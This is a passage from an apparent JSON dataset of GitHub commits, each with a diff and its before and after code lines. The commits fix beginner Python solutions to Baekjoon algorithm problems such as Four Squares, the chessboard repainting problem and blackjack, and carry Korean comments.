(Update)"},"1803b4d84d9336b5626d907ed1cdec57a28b52d4":{"url":"https:\/\/api.github.com\/repos\/sodabeans\/Algorithm\/commits\/1803b4d84d9336b5626d907ed1cdec57a28b52d4","html_url":"https:\/\/github.com\/sodabeans\/Algorithm\/commit\/1803b4d84d9336b5626d907ed1cdec57a28b52d4","sha":"1803b4d84d9336b5626d907ed1cdec57a28b52d4","keyword":"brute force update","diff":"diff --git a\/Baekjoon\/21735.py b\/Baekjoon\/21735.py\nindex f727dde..d07eece 100644\n--- a\/Baekjoon\/21735.py\n+++ b\/Baekjoon\/21735.py\n@@ -13,9 +13,9 @@ def dfs(idx, snowball, time):\n     else:\n         ans = max(snowball, ans)\n \n-    if idx < N - 1:\n+    if idx <= N - 1:\n         dfs(idx + 1, snowball + a[idx + 1], time + 1)\n-    if idx < N - 2:\n+    if idx <= N - 2:\n         dfs(idx + 2, snowball \/\/ 2 + a[idx + 2], time + 1)\n \n \n","message":"","files":{"\/Baekjoon\/21735.py":{"changes":[{"diff":"\n     else:\n         ans = max(snowball, ans)\n \n-    if idx < N - 1:\n+    if idx <= N - 1:\n         dfs(idx + 1, snowball + a[idx + 1], time + 1)\n-    if idx < N - 2:\n+    if idx <= N - 2:\n         dfs(idx + 2, snowball \/\/ 2 + a[idx + 2], time + 1)\n \n \n","add":2,"remove":2,"filename":"\/Baekjoon\/21735.py","badparts":["    if idx < N - 1:","    if idx < N - 2:"],"goodparts":["    if idx <= N - 1:","    if idx <= N - 2:"]}],"source":"\nimport sys input=sys.stdin.readline N, M=map(int, input().split()) a=[0] +list(map(int, input().split())) def dfs(idx, snowball, time): global ans if time > M: return else: ans=max(snowball, ans) if idx < N -1: dfs(idx +1, snowball +a[idx +1], time +1) if idx < N -2: dfs(idx +2, snowball \/\/ 2 +a[idx +2], time +1) ans=0 dfs(0, 1, 0) print(ans) ","sourceWithComments":"import sys\ninput = sys.stdin.readline\n\nN, M = map(int, input().split())\na = [0] + list(map(int, input().split()))  # starting position is 0\n\n\ndef dfs(idx, snowball, time):\n    global ans\n\n    if time > M:\n        return\n    else:\n        ans = max(snowball, ans)\n\n    if idx < N - 1:\n        dfs(idx + 1, snowball + a[idx + 1], time + 1)\n    if idx < N - 2:\n        dfs(idx + 2, snowball \/\/ 2 + a[idx + 2], time + 1)\n\n\nans = 0\ndfs(0, 1, 0)\nprint(ans)\n"}},"msg":"[Brute Force, Backtracking] \"\ub208\ub369\uc774 \uad74\ub9ac\uae30\" 21735 (Update)"},"e6956019d30772bf4450ae4780d9cef727631e4e":{"url":"https:\/\/api.github.com\/repos\/sodabeans\/Algorithm\/commits\/e6956019d30772bf4450ae4780d9cef727631e4e","html_url":"https:\/\/github.com\/sodabeans\/Algorithm\/commit\/e6956019d30772bf4450ae4780d9cef727631e4e","message":"[Brute Force] \"Four Squares\" (Update)","sha":"e6956019d30772bf4450ae4780d9cef727631e4e","keyword":"brute force update","diff":"diff --git a\/Baekjoon\/(DP) 17626.py b\/Baekjoon\/(DP) 17626.py\nindex 3539398..ab70300 100644\n--- a\/Baekjoon\/(DP) 17626.py\t\n+++ b\/Baekjoon\/(DP) 17626.py\t\n@@ -1,4 +1,3 @@\n-# timeout error\n import sys\n input = sys.stdin.readline\n \n@@ -6,11 +5,13 @@\n \n dp = [50001 for _ in range(n + 1)]\n dp[0] = 0\n+dp[1] = 1\n \n-for i in range(1, n + 1):\n-    for j in range(1, i + 1):\n-        square = j ** 2\n-        if square <= i:\n-            dp[i] = min(dp[i], dp[i - square] + 1)\n+for i in range(2, n + 1):\n+    j = 1\n+    while i >= j ** 2:\n+        dp[i] = min(dp[i], dp[i - j ** 2])\n+        j += 1\n+    dp[i] += 1\n \n print(dp[n])\n","files":{"\/Baekjoon\/(DP) 17626.py":{"changes":[{"diff":" \n dp = [50001 for _ in range(n + 1)]\n dp[0] = 0\n+dp[1] = 1\n \n-for i in range(1, n + 1):\n-    for j in range(1, i + 1):\n-        square = j ** 2\n-        if square <= i:\n-            dp[i] = min(dp[i], dp[i - square] + 1)\n+for i in range(2, n + 1):\n+    j = 1\n+    while i >= j ** 2:\n+        dp[i] = min(dp[i], dp[i - j ** 2])\n+        j += 1\n+    dp[i] += 1\n \n print(dp[n])\n","add":7,"remove":5,"filename":"\/Baekjoon\/(DP) 17626.py","badparts":["for i in range(1, n + 1):","    for j in range(1, i + 1):","        square = j ** 2","        if square <= i:","            dp[i] = min(dp[i], dp[i - square] + 1)"],"goodparts":["dp[1] = 1","for i in range(2, n + 1):","    j = 1","    while i >= j ** 2:","        dp[i] = min(dp[i], dp[i - j ** 2])","        j += 1","    dp[i] += 1"]}],"source":"\n\nimport sys input=sys.stdin.readline n=int(input()) dp=[50001 for _ in range(n +1)] dp[0]=0 for i in range(1, n +1): for j in range(1, i +1): square=j ** 2 if square <=i: dp[i]=min(dp[i], dp[i -square] +1) print(dp[n]) ","sourceWithComments":"# timeout error\nimport sys\ninput = sys.stdin.readline\n\nn = int(input())\n\ndp = [50001 for _ in range(n + 1)]\ndp[0] = 0\n\nfor i in range(1, n + 1):\n    for j in range(1, i + 1):\n        square = j ** 2\n        if square <= i:\n            dp[i] = min(dp[i], dp[i - square] + 1)\n\nprint(dp[n])\n"}},"msg":"[Brute Force] \"Four Squares\" (Update)"}},"https:\/\/github.com\/hn99515\/algorithm_gs":{"7703911cdce7e82cf664cc789a2872d876a2fc6d":{"url":"https:\/\/api.github.com\/repos\/hn99515\/algorithm_gs\/commits\/7703911cdce7e82cf664cc789a2872d876a2fc6d","html_url":"https:\/\/github.com\/hn99515\/algorithm_gs\/commit\/7703911cdce7e82cf664cc789a2872d876a2fc6d","message":"0823 brute_force update","sha":"7703911cdce7e82cf664cc789a2872d876a2fc6d","keyword":"brute force update","diff":"diff --git a\/Donguk\/brute_force\/[BOJ]1018.py b\/Donguk\/brute_force\/[BOJ]1018.py\nindex c0560fc..43a5107 100644\n--- a\/Donguk\/brute_force\/[BOJ]1018.py\n+++ b\/Donguk\/brute_force\/[BOJ]1018.py\n@@ -11,9 +11,31 @@\n '''\n \n N, M = map(int, input().split())\n-board = [list(input())]\n+board = [list(input()) for _ in range(N)]\n+board_min = []\n \n-for i in board:\n-    cnt = 0\n-    for j in board:\n+# 8x8 \ubc30\uc5f4\ub85c \ucc3e\uae30 \uc774\ubbc0\ub85c N-8+1 = index error \ud68c\ud53c!\n+for i in range(N-7):\n+    for j in range(M-7):\n+        w_cnt = 0         # white \uac00 \uba3c\uc800 \ub098\uc624\ub294 \uacbd\uc6b0 (2\uac00\uc9c0 \uacbd\uc6b0 \ub098\ub220\uc11c \uc811\uadfc)\n+        b_cnt = 0         # black \uc774 \uba3c\uc800 \ub098\uc624\ub294 \uacbd\uc6b0\n+\n+        # 8x8 \ubc30\uc5f4\ub85c \ucc3e\uae30\n+        for a in range(i, i+8):\n+            for b in range(j, j+8):\n+                if (a+b) % 2 == 0:          # \ud589\uacfc \uc5f4\uc744 \ub354\ud55c \uac12\uc774 \uc9dd\uc218\uc778 \uacbd\uc6b0 (2\uac00\uc9c0 \uacbd\uc6b0 \ub098\ub220\uc11c \uc811\uadfc)\n+                    if board[a][b] != 'W':  # W\uac00 \uc548\ub098\uc624\uba74 W\ub85c \ubc14\uafd4\uc57c\ud568\n+                        w_cnt += 1\n+                    else:                   # B\uac00 \uc548\ub098\uc624\uba74 B\ub85c \ubc14\uafd4\uc57c\ud568\n+                        b_cnt += 1\n+                else:                       # \ud589\uacfc \uc5f4\uc744 \ub354\ud55c \uac12\uc774 \ud640\uc218\uc778 \uacbd\uc6b0\n+                    if board[a][b] != 'B':\n+                        w_cnt += 1\n+                    else:\n+                        b_cnt += 1\n+\n+        board_min.append(w_cnt)             # \uac01\uac01\uc758 \ucd5c\uc18c \uac1c\uc218\ub97c \ub2f4\uc790\n+        board_min.append(b_cnt)\n+\n+print(min(board_min))                       # \ub458 \uc911\uc5d0 \ub354 \uc791\uc740 \uac12\uc744 \ucd9c\ub825\n \ndiff --git a\/Donguk\/brute_force\/[BOJ]1436.py b\/Donguk\/brute_force\/[BOJ]1436.py\nindex e34a739..01e26d0 100644\n--- a\/Donguk\/brute_force\/[BOJ]1436.py\n+++ b\/Donguk\/brute_force\/[BOJ]1436.py\n@@ -6,9 +6,9 @@\n     # \ubb38\uc790\uc5f4\uc740 \uba64\ubc84\uc2ed \uc5f0\uc0b0 \uac00\ub2a5\n     if '666' in str(num):\n         cnt += 1\n-    # cnt = N \uc778 \uacbd\uc6b0 = N\ubc88\uca30 \uc218\ub97c \ucd9c\ub825\n+    # cnt = N \uc778 \uacbd\uc6b0 = N\ubc88\uc9f8 \uc218\ub97c \ucd9c\ub825\n     if cnt == N:\n         print(num)\n         break\n-    # \uacc4\uc18d 1\uc744 \ub354\ud574 cnt \uc640 N\uc774 \ub3d9\uc77c\ud574\uc9c8 \ub584\uae4c\uc9c0 \ubb34\ud55c \ub8e8\ud504\n+    # \uacc4\uc18d 1\uc744 \ub354\ud574 cnt \uc640 N\uc774 \ub3d9\uc77c\ud574\uc9c8 \ub54c\uae4c\uc9c0 \ubb34\ud55c \ub8e8\ud504\n     num += 1\ndiff --git a\/Donguk\/brute_force\/[BOJ]2798.py b\/Donguk\/brute_force\/[BOJ]2798.py\nindex 659da6d..ae9b4bd 100644\n--- a\/Donguk\/brute_force\/[BOJ]2798.py\n+++ b\/Donguk\/brute_force\/[BOJ]2798.py\n@@ -14,8 +14,8 @@\n         for k in range(j+1, len(card_numbers)):\n             # \uce74\ub4dc 3\uc7a5\uc758 \ud569\uc774 M \uc774\ud558\uc778 \uacbd\uc6b0\n             if card_numbers[i] + card_numbers[j] + card_numbers[k] <= M:\n-                # \ucd5c\ub300\uac12 \uad6c\ud558\ub294 \ubc29\ubc95\n-                if res < card_numbers[i] + card_numbers[j] + card_numbers[k]:\n+                # \ucd5c\ub300\uac12 \uad6c\ud558\uae30\n+                if card_numbers[i] + card_numbers[j] + card_numbers[k] > res:\n                     res = card_numbers[i] + card_numbers[j] + card_numbers[k]\n \n print(res)\ndiff --git a\/Donguk\/brute_force\/[BOJ]7568.py b\/Donguk\/brute_force\/[BOJ]7568.py\nindex 3b6ba9f..4a2fd5a 100644\n--- a\/Donguk\/brute_force\/[BOJ]7568.py\n+++ b\/Donguk\/brute_force\/[BOJ]7568.py\n@@ -15,10 +15,10 @@\n     arr.append((x, y))\n \n # brute-force    \n-for i in arr:\n+for i in arr:       # (55, 185)\n     # \uc21c\uc704 \ucd08\uae30\ud654\n     rank = 1\n-    for j in arr:\n+    for j in arr:   # (55, 185), (58, 183), (88, 186), (60, 175), (46, 155) \n         # \ud29c\ud50c \uc778\ub371\uc2f1 = x\ub294 x\ub07c\ub9ac y\ub294 y\ub07c\ub9ac \ube44\uad50 \/ \uc870\uac74 \ub9cc\uc871\ud558\uba74 +1\n         if i[0] < j[0] and i[1] < j[1]:\n             rank += 1\n","files":{"\/Donguk\/brute_force\/[BOJ]1018.py":{"changes":[{"diff":"\n '''\n \n N, M = map(int, input().split())\n-board = [list(input())]\n+board = [list(input()) for _ in range(N)]\n+board_min = []\n \n-for i in board:\n-    cnt = 0\n-    for j in board:\n+# 8x8 \ubc30\uc5f4\ub85c \ucc3e\uae30 \uc774\ubbc0\ub85c N-8+1 = index error \ud68c\ud53c!\n+for i in range(N-7):\n+    for j in range(M-7):\n+        w_cnt = 0         # white \uac00 \uba3c\uc800 \ub098\uc624\ub294 \uacbd\uc6b0 (2\uac00\uc9c0 \uacbd\uc6b0 \ub098\ub220\uc11c \uc811\uadfc)\n+        b_cnt = 0         # black \uc774 \uba3c\uc800 \ub098\uc624\ub294 \uacbd\uc6b0\n+\n+        # 8x8 \ubc30\uc5f4\ub85c \ucc3e\uae30\n+        for a in range(i, i+8):\n+            for b in range(j, j+8):\n+                if (a+b) % 2 == 0:          # \ud589\uacfc \uc5f4\uc744 \ub354\ud55c \uac12\uc774 \uc9dd\uc218\uc778 \uacbd\uc6b0 (2\uac00\uc9c0 \uacbd\uc6b0 \ub098\ub220\uc11c \uc811\uadfc)\n+                    if board[a][b] != 'W':  # W\uac00 \uc548\ub098\uc624\uba74 W\ub85c \ubc14\uafd4\uc57c\ud568\n+                        w_cnt += 1\n+                    else:                   # B\uac00 \uc548\ub098\uc624\uba74 B\ub85c \ubc14\uafd4\uc57c\ud568\n+                        b_cnt += 1\n+                else:                       # \ud589\uacfc \uc5f4\uc744 \ub354\ud55c \uac12\uc774 \ud640\uc218\uc778 \uacbd\uc6b0\n+                    if board[a][b] != 'B':\n+                        w_cnt += 1\n+                    else:\n+                        b_cnt += 1\n+\n+        board_min.append(w_cnt)             # \uac01\uac01\uc758 \ucd5c\uc18c \uac1c\uc218\ub97c \ub2f4\uc790\n+        board_min.append(b_cnt)\n+\n+print(min(board_min))                       # \ub458 \uc911\uc5d0 \ub354 \uc791\uc740 \uac12\uc744 \ucd9c\ub825\n ","add":26,"remove":4,"filename":"\/Donguk\/brute_force\/[BOJ]1018.py","badparts":["board = [list(input())]","for i in board:","    cnt = 0","    for j in board:"],"goodparts":["board = [list(input()) for _ in range(N)]","board_min = []","for i in range(N-7):","    for j in range(M-7):","        w_cnt = 0         # white \uac00 \uba3c\uc800 \ub098\uc624\ub294 \uacbd\uc6b0 (2\uac00\uc9c0 \uacbd\uc6b0 \ub098\ub220\uc11c \uc811\uadfc)","        b_cnt = 0         # black \uc774 \uba3c\uc800 \ub098\uc624\ub294 \uacbd\uc6b0","        for a in range(i, i+8):","            for b in range(j, j+8):","                if (a+b) % 2 == 0:          # \ud589\uacfc \uc5f4\uc744 \ub354\ud55c \uac12\uc774 \uc9dd\uc218\uc778 \uacbd\uc6b0 (2\uac00\uc9c0 \uacbd\uc6b0 \ub098\ub220\uc11c \uc811\uadfc)","                    if board[a][b] != 'W':  # W\uac00 \uc548\ub098\uc624\uba74 W\ub85c \ubc14\uafd4\uc57c\ud568","                        w_cnt += 1","                    else:                   # B\uac00 \uc548\ub098\uc624\uba74 B\ub85c \ubc14\uafd4\uc57c\ud568","                        b_cnt += 1","                else:                       # \ud589\uacfc \uc5f4\uc744 \ub354\ud55c \uac12\uc774 \ud640\uc218\uc778 \uacbd\uc6b0","                    if board[a][b] != 'B':","                        w_cnt += 1","                    else:","                        b_cnt += 1","        board_min.append(w_cnt)             # \uac01\uac01\uc758 \ucd5c\uc18c \uac1c\uc218\ub97c \ub2f4\uc790","        board_min.append(b_cnt)","print(min(board_min))                       # \ub458 \uc911\uc5d0 \ub354 \uc791\uc740 \uac12\uc744 \ucd9c\ub825"]}],"source":"\n''' MN\uac1c\uc758 \ub2e8\uc704 \uc815\uc0ac\uac01\ud615\uc73c\ub85c \ub098\ub204\uc5b4\uc838 \uc788\ub294 M\u00d7N \ud06c\uae30\uc758 \ubcf4\ub4dc\ub97c \ucc3e\uc558\ub2e4. \uc5b4\ub5a4 \uc815\uc0ac\uac01\ud615\uc740 \uac80\uc740\uc0c9, \ub098\uba38\uc9c0\ub294 \ud770\uc0c9\uc73c\ub85c \uce60\ud574\uc838 \uc788\ub2e4. \uc774 \ubcf4\ub4dc\ub97c \uc798\ub77c\uc11c 8\u00d78 \ud06c\uae30\uc758 \uccb4\uc2a4\ud310\uc73c\ub85c \ub9cc\ub4e4\ub824\uace0 \ud55c\ub2e4. \uccb4\uc2a4\ud310\uc740 \uac80\uc740\uc0c9\uacfc \ud770\uc0c9\uc774 \ubc88\uac08\uc544\uc11c \uce60\ud574\uc838 \uc788\uc5b4\uc57c \ud55c\ub2e4. \uad6c\uccb4\uc801\uc73c\ub85c, \uac01 \uce78\uc774 \uac80\uc740\uc0c9\uacfc \ud770\uc0c9 \uc911 \ud558\ub098\ub85c \uc0c9\uce60\ub418\uc5b4 \uc788\uace0, \ubcc0\uc744 \uacf5\uc720\ud558\ub294 \ub450 \uac1c\uc758 \uc0ac\uac01\ud615\uc740 \ub2e4\ub978 \uc0c9\uc73c\ub85c \uce60\ud574\uc838 \uc788\uc5b4\uc57c \ud55c\ub2e4. \ub530\ub77c\uc11c \uc774 \uc815\uc758\ub97c \ub530\ub974\uba74 \uccb4\uc2a4\ud310\uc744 \uc0c9\uce60\ud558\ub294 \uacbd\uc6b0\ub294 \ub450 \uac00\uc9c0\ubfd0\uc774\ub2e4. \ud558\ub098\ub294 \ub9e8 \uc67c\ucabd \uc704 \uce78\uc774 \ud770\uc0c9\uc778 \uacbd\uc6b0, \ud558\ub098\ub294 \uac80\uc740\uc0c9\uc778 \uacbd\uc6b0 \ubcf4\ub4dc\uac00 \uccb4\uc2a4\ud310\ucc98\ub7fc \uce60\ud574\uc838 \uc788\ub2e4\ub294 \ubcf4\uc7a5\uc774 \uc5c6\uc5b4\uc11c, 8\u00d78 \ud06c\uae30\uc758 \uccb4\uc2a4\ud310\uc73c\ub85c \uc798\ub77c\ub0b8 \ud6c4\uc5d0 \uba87 \uac1c\uc758 \uc815\uc0ac\uac01\ud615\uc744 \ub2e4\uc2dc \uce60\ud574\uc57c\uaca0\ub2e4\uace0 \uc0dd\uac01\ud588\ub2e4. \ub2f9\uc5f0\ud788 8*8 \ud06c\uae30\ub294 \uc544\ubb34\ub370\uc11c\ub098 \uace8\ub77c\ub3c4 \ub41c\ub2e4. \uc9c0\ubbfc\uc774\uac00 \ub2e4\uc2dc \uce60\ud574\uc57c \ud558\ub294 \uc815\uc0ac\uac01\ud615\uc758 \ucd5c\uc18c \uac1c\uc218\ub97c \uad6c\ud558\ub294 \ud504\ub85c\uadf8\ub7a8 ''' N, M=map(int, input().split()) board=[list(input())] for i in board: cnt=0 for j in board: ","sourceWithComments":"'''\nMN\uac1c\uc758 \ub2e8\uc704 \uc815\uc0ac\uac01\ud615\uc73c\ub85c \ub098\ub204\uc5b4\uc838 \uc788\ub294 M\u00d7N \ud06c\uae30\uc758 \ubcf4\ub4dc\ub97c \ucc3e\uc558\ub2e4. \n\uc5b4\ub5a4 \uc815\uc0ac\uac01\ud615\uc740 \uac80\uc740\uc0c9, \ub098\uba38\uc9c0\ub294 \ud770\uc0c9\uc73c\ub85c \uce60\ud574\uc838 \uc788\ub2e4. \uc774 \ubcf4\ub4dc\ub97c \uc798\ub77c\uc11c 8\u00d78 \ud06c\uae30\uc758 \uccb4\uc2a4\ud310\uc73c\ub85c \ub9cc\ub4e4\ub824\uace0 \ud55c\ub2e4.\n\n\uccb4\uc2a4\ud310\uc740 \uac80\uc740\uc0c9\uacfc \ud770\uc0c9\uc774 \ubc88\uac08\uc544\uc11c \uce60\ud574\uc838 \uc788\uc5b4\uc57c \ud55c\ub2e4. \n\uad6c\uccb4\uc801\uc73c\ub85c, \uac01 \uce78\uc774 \uac80\uc740\uc0c9\uacfc \ud770\uc0c9 \uc911 \ud558\ub098\ub85c \uc0c9\uce60\ub418\uc5b4 \uc788\uace0, \ubcc0\uc744 \uacf5\uc720\ud558\ub294 \ub450 \uac1c\uc758 \uc0ac\uac01\ud615\uc740 \ub2e4\ub978 \uc0c9\uc73c\ub85c \uce60\ud574\uc838 \uc788\uc5b4\uc57c \ud55c\ub2e4.\n\ub530\ub77c\uc11c \uc774 \uc815\uc758\ub97c \ub530\ub974\uba74 \uccb4\uc2a4\ud310\uc744 \uc0c9\uce60\ud558\ub294 \uacbd\uc6b0\ub294 \ub450 \uac00\uc9c0\ubfd0\uc774\ub2e4. \ud558\ub098\ub294 \ub9e8 \uc67c\ucabd \uc704 \uce78\uc774 \ud770\uc0c9\uc778 \uacbd\uc6b0, \ud558\ub098\ub294 \uac80\uc740\uc0c9\uc778 \uacbd\uc6b0\n\n\ubcf4\ub4dc\uac00 \uccb4\uc2a4\ud310\ucc98\ub7fc \uce60\ud574\uc838 \uc788\ub2e4\ub294 \ubcf4\uc7a5\uc774 \uc5c6\uc5b4\uc11c, 8\u00d78 \ud06c\uae30\uc758 \uccb4\uc2a4\ud310\uc73c\ub85c \uc798\ub77c\ub0b8 \ud6c4\uc5d0 \uba87 \uac1c\uc758 \uc815\uc0ac\uac01\ud615\uc744 \ub2e4\uc2dc \uce60\ud574\uc57c\uaca0\ub2e4\uace0 \uc0dd\uac01\ud588\ub2e4. \n\ub2f9\uc5f0\ud788 8*8 \ud06c\uae30\ub294 \uc544\ubb34\ub370\uc11c\ub098 \uace8\ub77c\ub3c4 \ub41c\ub2e4. \uc9c0\ubbfc\uc774\uac00 \ub2e4\uc2dc \uce60\ud574\uc57c \ud558\ub294 \uc815\uc0ac\uac01\ud615\uc758 \ucd5c\uc18c \uac1c\uc218\ub97c \uad6c\ud558\ub294 \ud504\ub85c\uadf8\ub7a8\n'''\n\nN, M = map(int, input().split())\nboard = [list(input())]\n\nfor i in board:\n    cnt = 0\n    for j in board:\n\n"},"\/Donguk\/brute_force\/[BOJ]2798.py":{"changes":[{"diff":"\n         for k in range(j+1, len(card_numbers)):\n             # \uce74\ub4dc 3\uc7a5\uc758 \ud569\uc774 M \uc774\ud558\uc778 \uacbd\uc6b0\n             if card_numbers[i] + card_numbers[j] + card_numbers[k] <= M:\n-                # \ucd5c\ub300\uac12 \uad6c\ud558\ub294 \ubc29\ubc95\n-                if res < card_numbers[i] + card_numbers[j] + card_numbers[k]:\n+                # \ucd5c\ub300\uac12 \uad6c\ud558\uae30\n+                if card_numbers[i] + card_numbers[j] + card_numbers[k] > res:\n                     res = card_numbers[i] + card_numbers[j] + card_numbers[k]\n \n print(re","add":2,"remove":2,"filename":"\/Donguk\/brute_force\/[BOJ]2798.py","badparts":["                if res < card_numbers[i] + card_numbers[j] + card_numbers[k]:"],"goodparts":["                if card_numbers[i] + card_numbers[j] + card_numbers[k] > res:"]}],"source":"\n''' \ud50c\ub808\uc774\uc5b4\ub294 \uc81c\ud55c\ub41c \uc2dc\uac04 \uc548\uc5d0 N\uc7a5\uc758 \uce74\ub4dc \uc911\uc5d0\uc11c 3\uc7a5\uc758 \uce74\ub4dc\ub97c \uace0\ub978\ub2e4. \ud50c\ub808\uc774\uc5b4\uac00 \uace0\ub978 \uce74\ub4dc\uc758 \ud569\uc740 M\uc744 \ub118\uc9c0 \uc54a\uc73c\uba74\uc11c M\uacfc \ucd5c\ub300\ud55c \uac00\uae5d\uac8c \ub9cc\ub4e0\ub2e4. M\uc744 \ub118\uc9c0 \uc54a\uc73c\uba74\uc11c M\uc5d0 \ucd5c\ub300\ud55c \uac00\uae4c\uc6b4 \uce74\ub4dc 3\uc7a5\uc758 \ud569\uc744 \uad6c\ud574 \ucd9c\ub825 ''' N, M=map(int, input().split()) card_numbers=list(map(int, input().split())) res=0 for i in range(len(card_numbers)): for j in range(i+1, len(card_numbers)): for k in range(j+1, len(card_numbers)): if card_numbers[i] +card_numbers[j] +card_numbers[k] <=M: if res < card_numbers[i] +card_numbers[j] +card_numbers[k]: res=card_numbers[i] +card_numbers[j] +card_numbers[k] print(res) ","sourceWithComments":"'''\n\ud50c\ub808\uc774\uc5b4\ub294 \uc81c\ud55c\ub41c \uc2dc\uac04 \uc548\uc5d0 N\uc7a5\uc758 \uce74\ub4dc \uc911\uc5d0\uc11c 3\uc7a5\uc758 \uce74\ub4dc\ub97c \uace0\ub978\ub2e4.\n\ud50c\ub808\uc774\uc5b4\uac00 \uace0\ub978 \uce74\ub4dc\uc758 \ud569\uc740 M\uc744 \ub118\uc9c0 \uc54a\uc73c\uba74\uc11c M\uacfc \ucd5c\ub300\ud55c \uac00\uae5d\uac8c \ub9cc\ub4e0\ub2e4.\n\nM\uc744 \ub118\uc9c0 \uc54a\uc73c\uba74\uc11c M\uc5d0 \ucd5c\ub300\ud55c \uac00\uae4c\uc6b4 \uce74\ub4dc 3\uc7a5\uc758 \ud569\uc744 \uad6c\ud574 \ucd9c\ub825\n'''\nN, M = map(int, input().split())\ncard_numbers = list(map(int, input().split()))\n\nres = 0\n# 3\uc7a5\uc758 \ubaa8\ub4e0 \uce74\ub4dc \uc870\ud569\uc744 \ud655\uc778\nfor i in range(len(card_numbers)):\n    for j in range(i+1, len(card_numbers)):\n        for k in range(j+1, len(card_numbers)):\n            # \uce74\ub4dc 3\uc7a5\uc758 \ud569\uc774 M \uc774\ud558\uc778 \uacbd\uc6b0\n            if card_numbers[i] + card_numbers[j] + card_numbers[k] <= M:\n                # \ucd5c\ub300\uac12 \uad6c\ud558\ub294 \ubc29\ubc95\n                if res < card_numbers[i] + card_numbers[j] + card_numbers[k]:\n                    res = card_numbers[i] + card_numbers[j] + card_numbers[k]\n\nprint(res)\n\n"},"\/Donguk\/brute_force\/[BOJ]7568.py":{"changes":[{"diff":"\n     arr.append((x, y))\n \n # brute-force    \n-for i in arr:\n+for i in arr:       # (55, 185)\n     # \uc21c\uc704 \ucd08\uae30\ud654\n     rank = 1\n-    for j in arr:\n+    for j in arr:   # (55, 185), (58, 183), (88, 186), (60, 175), (46, 155) \n         # \ud29c\ud50c \uc778\ub371\uc2f1 = x\ub294 x\ub07c\ub9ac y\ub294 y\ub07c\ub9ac \ube44\uad50 \/ \uc870\uac74 \ub9cc\uc871\ud558\uba74 +1\n         if i[0] < j[0] and i[1] < j[1]:\n             rank += 1\n","add":2,"remove":2,"filename":"\/Donguk\/brute_force\/[BOJ]7568.py","badparts":["for i in arr:","    for j in arr:"],"goodparts":["for i in arr:       # (55, 185)","    for j in arr:   # (55, 185), (58, 183), (88, 186), (60, 175), (46, 155) "]}],"source":"\n''' \ud0a4\uc640 \ubab8\ubb34\uac8c, \uc774 \ub450 \uac1c\uc758 \uac12\uc73c\ub85c \ub4f1\uc218\ub97c \ub9e4\uaca8\ubcf4\ub824\uace0 \ud55c\ub2e4. \uc5b4\ub5a4 \uc0ac\ub78c\uc758 \ubab8\ubb34\uac8c\uac00 x kg\uc774\uace0 \ud0a4\uac00 y cm\ub77c\uba74 \uc774 \uc0ac\ub78c\uc758 \ub369\uce58\ub294(x, y)\ub85c \ud45c\uc2dc\ub41c\ub2e4. \ub450 \uc0ac\ub78c A \uc640 B\uc758 \ub369\uce58\uac00 \uac01\uac01(x, y),(p, q)\ub77c\uace0 \ud560 \ub54c x > p \uadf8\ub9ac\uace0 y > q \uc774\ub77c\uba74 \uc6b0\ub9ac\ub294 A\uc758 \ub369\uce58\uac00 B\uc758 \ub369\uce58\ubcf4\ub2e4 \"\ub354 \ud06c\ub2e4\"\uace0 \ub9d0\ud55c\ub2e4. \ub9cc\uc77c \uc790\uc2e0\ubcf4\ub2e4 \ub354 \ud070 \ub369\uce58\uc758 \uc0ac\ub78c\uc774 k\uba85\uc774\ub77c\uba74 \uadf8 \uc0ac\ub78c\uc758 \ub369\uce58 \ub4f1\uc218\ub294 k+1\uc774 \ub41c\ub2e4. \uc774\ub807\uac8c \ub4f1\uc218\ub97c \uacb0\uc815\ud558\uba74 \uac19\uc740 \ub369\uce58 \ub4f1\uc218\ub97c \uac00\uc9c4 \uc0ac\ub78c\uc740 \uc5ec\ub7ec \uba85\ub3c4 \uac00\ub2a5\ud558\ub2e4. \uc544\ub798\ub294 5\uba85\uc73c\ub85c \uc774\ub8e8\uc5b4\uc9c4 \uc9d1\ub2e8\uc5d0\uc11c \uac01 \uc0ac\ub78c\uc758 \ub369\uce58\uc640 \uadf8 \ub4f1\uc218\uac00 \ud45c\uc2dc\ub41c \ud45c\uc774\ub2e4. ''' N=int(input()) arr=[] for tc in range(N): x, y=map(int, input().split()) arr.append((x, y)) for i in arr: rank=1 for j in arr: if i[0] < j[0] and i[1] < j[1]: rank +=1 print(rank) ","sourceWithComments":"'''\n\ud0a4\uc640 \ubab8\ubb34\uac8c, \uc774 \ub450 \uac1c\uc758 \uac12\uc73c\ub85c \ub4f1\uc218\ub97c \ub9e4\uaca8\ubcf4\ub824\uace0 \ud55c\ub2e4. \n\uc5b4\ub5a4 \uc0ac\ub78c\uc758 \ubab8\ubb34\uac8c\uac00 x kg\uc774\uace0 \ud0a4\uac00 y cm\ub77c\uba74 \uc774 \uc0ac\ub78c\uc758 \ub369\uce58\ub294 (x, y)\ub85c \ud45c\uc2dc\ub41c\ub2e4.\n\ub450 \uc0ac\ub78c A \uc640 B\uc758 \ub369\uce58\uac00 \uac01\uac01 (x, y), (p, q)\ub77c\uace0 \ud560 \ub54c x > p \uadf8\ub9ac\uace0 y > q \uc774\ub77c\uba74 \uc6b0\ub9ac\ub294 A\uc758 \ub369\uce58\uac00 B\uc758 \ub369\uce58\ubcf4\ub2e4 \"\ub354 \ud06c\ub2e4\"\uace0 \ub9d0\ud55c\ub2e4.\n\n\ub9cc\uc77c \uc790\uc2e0\ubcf4\ub2e4 \ub354 \ud070 \ub369\uce58\uc758 \uc0ac\ub78c\uc774 k\uba85\uc774\ub77c\uba74 \uadf8 \uc0ac\ub78c\uc758 \ub369\uce58 \ub4f1\uc218\ub294 k+1\uc774 \ub41c\ub2e4. \n\uc774\ub807\uac8c \ub4f1\uc218\ub97c \uacb0\uc815\ud558\uba74 \uac19\uc740 \ub369\uce58 \ub4f1\uc218\ub97c \uac00\uc9c4 \uc0ac\ub78c\uc740 \uc5ec\ub7ec \uba85\ub3c4 \uac00\ub2a5\ud558\ub2e4. \n\uc544\ub798\ub294 5\uba85\uc73c\ub85c \uc774\ub8e8\uc5b4\uc9c4 \uc9d1\ub2e8\uc5d0\uc11c \uac01 \uc0ac\ub78c\uc758 \ub369\uce58\uc640 \uadf8 \ub4f1\uc218\uac00 \ud45c\uc2dc\ub41c \ud45c\uc774\ub2e4.\n'''\nN = int(input())\narr = []\nfor tc in range(N):\n    x, y = map(int, input().split())\n    # tuple \ud615\ud0dc\ub85c \ud55c \uc30d \ubb36\uc5b4\uc11c \ub9ac\uc2a4\ud2b8\uc5d0 \uc800\uc7a5\n    arr.append((x, y))\n\n# brute-force    \nfor i in arr:\n    # \uc21c\uc704 \ucd08\uae30\ud654\n    rank = 1\n    for 